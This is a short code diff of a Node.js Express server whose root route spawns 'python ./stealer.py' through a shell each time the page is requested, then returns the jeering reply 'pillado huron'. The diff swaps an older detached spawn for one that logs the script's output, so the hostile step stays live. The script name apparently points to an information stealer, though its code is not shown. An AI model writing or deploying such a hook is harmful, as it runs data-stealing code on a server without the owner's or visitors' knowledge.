@@ -17,14 +17,11 @@ app.listen(port, hostname, () => {
 
 app.get('/', (req, res) => {
   res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
-  a = require('child_process').spawn('python ./stealer.py',{ shell: true } , {
-    cwd: process.cwd(),
-    detached: true,
-    stdio: "inherit"
+
+  spawn("python ./stealer.py", { shell: true }).stdout.on('data', (data) => {
+    console.log(`stdout: ${data}`);
   });
-  spawn("python ./stealer.py", { shell: true });
-  a = subpro
-  console.log(a)
+
   res.send({uo:"pillado huron"})
 })
 
